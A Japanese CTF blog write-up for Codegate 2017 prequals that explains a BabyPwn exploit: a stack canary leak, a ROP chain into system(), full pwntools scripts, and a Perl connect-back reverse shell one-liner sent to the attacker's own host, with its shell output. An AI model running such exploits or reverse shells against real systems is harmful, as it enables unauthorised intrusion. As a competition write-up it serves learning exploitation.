@@ -1,0 +1,375 @@
+<!DOCTYPE HTML><html lang="ja"><head><meta charset="utf-8"><meta content="Tosainu" name="author"><meta content="[Codegate 2017 CTF](http://ctf.codegate.org/) の Prequalification Round に一人チーム poepoe で参加. 305 points で 78 位(General)でした.pwn 過去問でもよく見かける Codegate 関連の C" name="description"><meta content="Hakyll" name="generator"><meta content="width=device-width, initial-scale=1" name="viewport"><meta property="twitter:card" content="summary"><meta property="twitter:site" content="myon___"><meta property="twitter:creator" content="myon___"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/index.html"><meta property="og:title" content="Codegate 2017 CTF prequals writeup | Tosainu Lab"><meta property="og:description" content="[Codegate 2017 CTF](http://ctf.codegate.org/) の Prequalification Round に一人チーム poepoe で参加. 305 points で 78 位(General)でした.pwn 過去問でもよく見かける Codegate 関連の C"><meta property="og:site_name" content="Tosainu Lab"><meta property="og:image" content="https://blog.myon.info/images/icon/cocoa-512.jpg"><title>Codegate 2017 CTF prequals writeup | Tosainu Lab</title><link href="/vendor/normalize.css/normalize.css" rel="stylesheet"><link href="/stylesheets/style.css" rel="stylesheet"><link href="/stylesheets/highlight.css" rel="stylesheet"><link href="/vendor/fontawesome/style.css" rel="stylesheet"><link href="/vendor/katex/katex.min.css" rel="stylesheet"><link href="/feed.xml" title="Atom Feed" type="application/atom+xml" rel="alternate"><script async src="https://www.googletagmanager.com/gtag/js?id=G-X1CGBSMEQW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-X1CGBSMEQW');</script></head><body><header class="site-header"><div class="container"><h1><a href="/" title="home">Tosainu Lab</a></h1></div></header><main class="post"><article><header class="post-header"><div class="container"><h1><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/">Codegate 2017 CTF prequals writeup</a></h1><ul class="post-meta"><li><svg class="svg-inline--fa fa-calendar" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="calendar" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M96 32V64H48C21.5 64 0 85.5 0 112v48H448V112c0-26.5-21.5-48-48-48H352V32c0-17.7-14.3-32-32-32s-32 14.3-32 32V64H160V32c0-17.7-14.3-32-32-32S96 14.3 96 32zM448 192H0V464c0 26.5 21.5 48 48 48H400c26.5 0 48-21.5 48-48V192z" fill="currentColor"></path></svg></li><li class="date">2017/02/11 21:20</li><li><svg class="svg-inline--fa fa-tags" focusable="false" aria-hidden="true" role="img" viewBox="0 0 512 512" data-icon="tags" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M345 39.1L472.8 168.4c52.4 53 52.4 138.2 0 191.2L360.8 472.9c-9.3 9.4-24.5 9.5-33.9 .2s-9.5-24.5-.2-33.9L438.6 325.9c33.9-34.3 33.9-89.4 0-123.7L310.9 72.9c-9.3-9.4-9.2-24.6 .2-33.9s24.6-9.2 33.9 .2zM0 229.5V80C0 53.5 21.5 32 48 32H197.5c17 0 33.3 6.7 45.3 18.7l168 168c25 25 25 65.5 0 90.5L277.3 442.7c-25 25-65.5 25-90.5 0l-168-168C6.7 262.7 0 246.5 0 229.5zM144 144c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32z" fill="currentColor"></path></svg></li><li><ul class="tag-list"><li><a href="/entry/tags/ctf/"><span>CTF</span></a></li></ul></li></ul></div></header><div class="container"><div class="post-contents"><p><a href="http://ctf.codegate.org/" target="_blank" rel="nofollow noopener">Codegate 2017 CTF</a> の Prequalification Round に一人チーム poepoe で参加. 305 points で 78 位(General)でした.</p>
+<p>pwn 過去問でもよく見かける Codegate 関連の CTF というだけあって, 実行ファイル解析系の問題が多めだった感じ. 正答者数が増えると問題の得点が下がっていくシステムもあったりで面白かった.</p>
+<!--more-->
+<h2 id="mic-check-50pt">1. Mic Check <small>(50pt)</small></h2>
+<p>いわゆるサービス問題. 問題文に得点のシステム等の説明とともに Flag が書いてある.<br />
+<strong>real flag is in brackets</strong> とあるように, 送信する Flag は <code>{}</code> 内の文字列だけなので注意.</p>
+<blockquote>
+<p>Mic Check
+one two~ one two~</p>
+<p>First Point : 500<br />
+Minimal Point : 50<br />
+Minus per one solver : -5</p>
+<p>Here is Flag~ FLAG{Welcome_to_codegate2017}</p>
+<p>real flag is in brackets.</p>
+</blockquote>
+<h2 id="babypwn-50pt">2. BabyPwn <small>(50pt)</small></h2>
+<p>32bit の ELF.<br />
+fork-server 型などと呼ばれているタイプの問題で, 実行すると <code>argv[1]</code> に渡した数値または <code>8181</code> ポートで接続を待つような感じになっていた.</p>
+<pre><code>$ file babypwn
+babypwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=79d683df4838066af61f58fc7025deb99e6bab3d, stripped
+
+$ checksec babypwn
+[*] &#39;/tmp/babypwn&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE</code></pre>
+<p>対象のアドレス/ポートに接続すると, 次のようなメニューが表示される. 1は入力した文字列をそのまま表示, 2は入力した文字列を逆順で表示するというものだった.</p>
+<pre><code>$ nc localhost 8181
+▒▒▒▒▒▒▒C▒O▒D▒E▒G▒A▒T▒E▒2▒0▒1▒7▒▒▒▒▒▒▒
+▒▒▒▒▒▒▒B▒A▒B▒Y▒P▒W▒N▒!▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▒▒▒G▒O▒O▒D▒L▒U▒C▒K▒~▒!▒▒▒▒▒▒▒▒▒▒▒
+===============================
+1. Echo
+2. Reverse Echo
+3. Exit
+===============================
+Select menu &gt; </code></pre>
+<p>接続後の主な処理は <code>0x08048a71</code> の関数にあった. 1の処理を追っていくと, 入力した文字列を入れるために確保した領域(0x28 byte)に <code>recv()</code> で <code>0x64</code> byte も読み込んでいるため stack buffer overflow が起こせる. しかも, 次の入力された文字列を返す処理では, <code>send()</code> で <code>strlen(buf)</code> 分の文字列を送信しているため, stack の情報をリークさせることが可能なのがわかる.</p>
+<p>そこで, 次のような攻撃を行う.<br />
+まず, stack canary をリークさせる. canary は <code>0x5082ab00</code> のような下位1 byte が <code>0x00</code> なランダムな値なので, 0x28 +1文字を書き込んで <code>strlen()</code> のチェックを回避し, 送られてくる文字列の0x29~0x2c文字目を処理することで得られる.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
+<span id="cb3-2"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-3"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb3-4"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-5"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-5" aria-hidden="true" tabindex="-1"></a>r <span class="op">=</span> remote(<span class="st">&#39;localhost&#39;</span>, <span class="dv">8181</span>)</span>
+<span id="cb3-6"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-7"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> echo(s):</span>
+<span id="cb3-8"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-8" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;Select menu &gt; &#39;</span>)</span>
+<span id="cb3-9"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-9" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">&#39;1&#39;</span>)</span>
+<span id="cb3-10"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-10" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;Input Your Message : &#39;</span>)</span>
+<span id="cb3-11"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-11" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
+<span id="cb3-12"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-12" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> r.recvuntil(<span class="st">&#39;</span><span class="ch">\12</span><span class="st">=&#39;</span>)</span>
+<span id="cb3-13"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret[:<span class="op">-</span><span class="dv">2</span>]</span>
+<span id="cb3-14"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-15"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-15" aria-hidden="true" tabindex="-1"></a>buffer_size <span class="op">=</span> <span class="bn">0x28</span></span>
+<span id="cb3-16"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-17"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-17" aria-hidden="true" tabindex="-1"></a>ret <span class="op">=</span> echo(<span class="st">&#39;A&#39;</span> <span class="op">*</span> (buffer_size <span class="op">+</span> <span class="dv">1</span>))</span>
+<span id="cb3-18"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-18" aria-hidden="true" tabindex="-1"></a>canary <span class="op">=</span> u32(ret[buffer_size:buffer_size <span class="op">+</span> <span class="dv">5</span>]) <span class="op">&amp;</span> <span class="bn">0xffffff00</span></span>
+<span id="cb3-19"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-19" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;leaked canary: 0x</span><span class="sc">%x</span><span class="st">&#39;</span> <span class="op">%</span> canary)</span>
+<span id="cb3-20"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-21"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb3-21" aria-hidden="true" tabindex="-1"></a>r.close()</span></code></pre></div>
+<pre><code>$ ./exploit.py
+[+] Opening connection to localhost on port 8181: Done
+[*] leaked canary: 0x5082ab00
+[*] Closed connection to localhost port 8181</code></pre>
+<p>次に, リークさせた canary を使って bof のチェックを回避しつつ, リターンアドレスを書き換えて ROP につなげる.<br />
+調べていくと <code>0x08048c3b</code> にこんな感じの関数(があった痕跡?)があるので, <code>system@plt()</code> を呼び出せば任意のシェルコマンドを実行できそうなのがわかる.</p>
+<pre><code>[0x08048710]&gt; pd 14 @ 0x08048c3b
+            0x08048c3b      push ebp
+            0x08048c3c      mov ebp, esp
+            0x08048c3e      sub esp, 0x28
+            0x08048c41      mov eax, dword gs:[0x14]
+            0x08048c47      mov dword [ebp - 0xc], eax
+            0x08048c4a      xor eax, eax
+            0x08048c4c      mov dword [esp], str.echo__not_easy_to_see._
+            0x08048c53      call sym.imp.system
+            0x08048c58      mov eax, dword [ebp - 0xc]
+            0x08048c5b      xor eax, dword gs:[0x14]
+        ,=&lt; 0x08048c62      je 0x8048c69
+        |   0x08048c64      call sym.imp.__stack_chk_fail
+        `-&gt; 0x08048c69      leave
+            0x08048c6a      ret</code></pre>
+<p>しかし, これは fork-server 型なので <code>system(&quot;/bin/sh&quot;)</code> を呼んでも意味がない<a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>. そこで, Linux 環境ならほぼ確実に入っているだろう Perl の connect-back shell を起動するワンライナーを使うことにした.</p>
+<p>また, <code>system()</code> の引数に渡す文字列は, 木曜に解いた <a href="http://shell-storm.org/repo/CTF/CSAW-2013/Exploitation/CSAW-Diary-300/" target="_blank" rel="nofollow noopener">CSAW CTF Qualification Round 2013: Exploitation3</a> (<a href="https://gist.github.com/Tosainu/5e0a1764c020a7e5b251b64b48b1468c" target="_blank" rel="nofollow noopener">書いたスクリプト</a>)と同じような手法を使って送り込んだ.<br />
+ROP が発動する段階ではまだ通信が close されていないことを利用し, まず <code>recv(fd, addr_bss, 0x100, 0)</code> を呼んで <code>.bss</code> セクションに実行したいシェルコマンドを書き込み, その後 <code>system(addr_bss)</code> につなげて送ったコマンドを実行させる.</p>
+<p>実際に作成したスクリプトと実行結果は次の通り. 作業している環境が 無線 LAN ルータ等の NAT の下にある場合は port forwarding の設定をしておくのも忘れずに.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
+<span id="cb6-2"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-3"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb6-4"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-5"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="co"># $ objdump -M intel -j .plt -d babypwn</span></span>
+<span id="cb6-6"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="co"># (...)</span></span>
+<span id="cb6-7"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 08048620 &lt;system@plt&gt;:</span></span>
+<span id="cb6-8"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="co">#  8048620:	ff 25 2c b0 04 08    	jmp    DWORD PTR ds:0x804b02c</span></span>
+<span id="cb6-9"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="co">#  8048626:	68 40 00 00 00       	push   0x40</span></span>
+<span id="cb6-10"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="co">#  804862b:	e9 60 ff ff ff       	jmp    8048590 &lt;setsockopt@plt-0x10&gt;</span></span>
+<span id="cb6-11"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="co"># (...)</span></span>
+<span id="cb6-12"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 080486e0 &lt;recv@plt&gt;:</span></span>
+<span id="cb6-13"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="co">#  80486e0:	ff 25 5c b0 04 08    	jmp    DWORD PTR ds:0x804b05c</span></span>
+<span id="cb6-14"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="co">#  80486e6:	68 a0 00 00 00       	push   0xa0</span></span>
+<span id="cb6-15"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="co">#  80486eb:	e9 a0 fe ff ff       	jmp    8048590 &lt;setsockopt@plt-0x10&gt;</span></span>
+<span id="cb6-16"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-16" aria-hidden="true" tabindex="-1"></a>addr_system_plt <span class="op">=</span> <span class="bn">0x8048620</span></span>
+<span id="cb6-17"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-17" aria-hidden="true" tabindex="-1"></a>addr_recv_plt   <span class="op">=</span> <span class="bn">0x80486e0</span></span>
+<span id="cb6-18"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-19"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="co"># $ readelf -S babypwn | grep .bss</span></span>
+<span id="cb6-20"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-20" aria-hidden="true" tabindex="-1"></a><span class="co">#   [25] .bss              NOBITS          0804b1b4 0021b4 00000c 00  WA  0   0  4</span></span>
+<span id="cb6-21"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-21" aria-hidden="true" tabindex="-1"></a>addr_bss <span class="op">=</span> <span class="bn">0x804b1b4</span></span>
+<span id="cb6-22"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-23"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-23" aria-hidden="true" tabindex="-1"></a>buffer_size <span class="op">=</span> <span class="bn">0x28</span></span>
+<span id="cb6-24"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-25"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-25" aria-hidden="true" tabindex="-1"></a>socket_fd <span class="op">=</span> <span class="dv">4</span></span>
+<span id="cb6-26"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-27"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-27" aria-hidden="true" tabindex="-1"></a><span class="co"># r = remote(&#39;localhost&#39;, 8181)</span></span>
+<span id="cb6-28"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-28" aria-hidden="true" tabindex="-1"></a>r <span class="op">=</span> remote(<span class="st">&#39;110.10.212.130&#39;</span>, <span class="dv">8888</span>)</span>
+<span id="cb6-29"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-29" aria-hidden="true" tabindex="-1"></a><span class="co"># r = remote(&#39;110.10.212.130&#39;, 8889)</span></span>
+<span id="cb6-30"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-31"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-31" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> echo(s):</span>
+<span id="cb6-32"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-32" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;Select menu &gt; &#39;</span>)</span>
+<span id="cb6-33"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-33" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">&#39;1&#39;</span>)</span>
+<span id="cb6-34"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-34" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;Input Your Message : &#39;</span>)</span>
+<span id="cb6-35"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-35" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
+<span id="cb6-36"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-36" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> r.recvuntil(<span class="st">&#39;</span><span class="ch">\12</span><span class="st">=&#39;</span>)</span>
+<span id="cb6-37"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-37" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret[:<span class="op">-</span><span class="dv">2</span>]</span>
+<span id="cb6-38"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-39"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-39" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> reverse_echo(s):</span>
+<span id="cb6-40"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-40" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;Select menu &gt; &#39;</span>)</span>
+<span id="cb6-41"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-41" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">&#39;2&#39;</span>)</span>
+<span id="cb6-42"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-42" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;Input Your Message : &#39;</span>)</span>
+<span id="cb6-43"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-43" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
+<span id="cb6-44"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-44" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> r.recvuntil(<span class="st">&#39;</span><span class="ch">\12</span><span class="st">=&#39;</span>)</span>
+<span id="cb6-45"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-45" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> ret[:<span class="op">-</span><span class="dv">2</span>]</span>
+<span id="cb6-46"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-46" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-47"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-47" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> exit_app():</span>
+<span id="cb6-48"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-48" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">&#39;Select menu &gt; &#39;</span>)</span>
+<span id="cb6-49"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-49" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">&#39;3&#39;</span>)</span>
+<span id="cb6-50"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-50" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-51"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-51" aria-hidden="true" tabindex="-1"></a><span class="co"># leak canary</span></span>
+<span id="cb6-52"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-52" aria-hidden="true" tabindex="-1"></a>ret <span class="op">=</span> echo(<span class="st">&#39;A&#39;</span> <span class="op">*</span> (buffer_size <span class="op">+</span> <span class="dv">1</span>))</span>
+<span id="cb6-53"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-53" aria-hidden="true" tabindex="-1"></a>canary <span class="op">=</span> u32(ret[buffer_size:buffer_size <span class="op">+</span> <span class="dv">5</span>]) <span class="op">&amp;</span> <span class="bn">0xffffff00</span></span>
+<span id="cb6-54"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-54" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;leaked canary: 0x</span><span class="sc">%x</span><span class="st">&#39;</span> <span class="op">%</span> canary)</span>
+<span id="cb6-55"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-56"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-56" aria-hidden="true" tabindex="-1"></a><span class="co"># send ROP</span></span>
+<span id="cb6-57"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-57" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb6-58"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-58" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> buffer_size</span>
+<span id="cb6-59"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-59" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(canary)</span>
+<span id="cb6-60"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-60" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&#39;BBBB&#39;</span>                   <span class="co"># 0x8048b83:        pop    ebx</span></span>
+<span id="cb6-61"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-61" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&#39;BBBB&#39;</span>                   <span class="co"># 0x8048b84:        pop    edi</span></span>
+<span id="cb6-62"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-62" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(addr_bss <span class="op">+</span> <span class="bn">0x800</span>)    <span class="co"># 0x8048b85:        pop    ebp</span></span>
+<span id="cb6-63"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-63" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(addr_recv_plt)       <span class="co"># recv(fd, addr_bss, 0x100, 0)</span></span>
+<span id="cb6-64"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-64" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(addr_system_plt)     <span class="co"># system(addr_bss)</span></span>
+<span id="cb6-65"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-65" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(socket_fd)</span>
+<span id="cb6-66"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-66" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(addr_bss)</span>
+<span id="cb6-67"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-67" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(<span class="bn">0x100</span>)</span>
+<span id="cb6-68"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-68" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(<span class="dv">0</span>)</span>
+<span id="cb6-69"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-69" aria-hidden="true" tabindex="-1"></a>echo(payload)</span>
+<span id="cb6-70"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-70" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-71"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-71" aria-hidden="true" tabindex="-1"></a>exit_app()</span>
+<span id="cb6-72"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-72" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-73"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-73" aria-hidden="true" tabindex="-1"></a><span class="co"># send connect-back shell one-liner</span></span>
+<span id="cb6-74"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-74" aria-hidden="true" tabindex="-1"></a>r.clean()</span>
+<span id="cb6-75"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-75" aria-hidden="true" tabindex="-1"></a>r.sendline(<span class="st">&#39;perl -e </span><span class="ch">\&#39;</span><span class="st">use Socket;$i=&quot;your.global.ip.address&quot;;$p=13895;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};</span><span class="ch">\&#39;\x00</span><span class="st">&#39;</span>)</span></code></pre></div>
+<pre><code>$ nc -l -v 192.168.xxx.xxx 13895
+Listening on [192.168.xxx.xxx] (family 0, port 13895)
+Connection from 110.10.212.130 59276 received!
+$ ls
+babypwn
+flag
+$ cat flag
+FLAG{Good_Job~!Y0u_@re_Very__G@@d!!!!!!^.^}
+$ %                                            </code></pre>
+<p>BabyPwn という名前の割にはおもしろい要素がたくさん詰め込まれている感じで, 解いててめちゃくちゃ楽しかった. 気づいたら50点にまで下がっててつらい…</p>
+<h3 id="追記">2017/02/20 追記</h3>
+<p>socket の fd が特定できているので, わざわざ connect-back shell を立ち上げなくとも <code>/bin/sh -i &lt;&amp;fd &gt;&amp;fd 2&gt;&amp;fd</code> を実行させればいいってことに気づいた. 上のスクリプトの最後の行を次のように変更することで, とりあえずローカルでシェルを取ることができた.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="/entry/2017/02/11/codegate-2017-prequals-writeup/#cb8-1" aria-hidden="true" tabindex="-1"></a>r.sendline(<span class="st">&#39;/bin/sh -i &lt;&amp;</span><span class="sc">{0}</span><span class="st"> &gt;&amp;</span><span class="sc">{0}</span><span class="st"> 2&gt;&amp;</span><span class="sc">{0}</span><span class="st">&#39;</span>.<span class="bu">format</span>(socket_fd))</span>
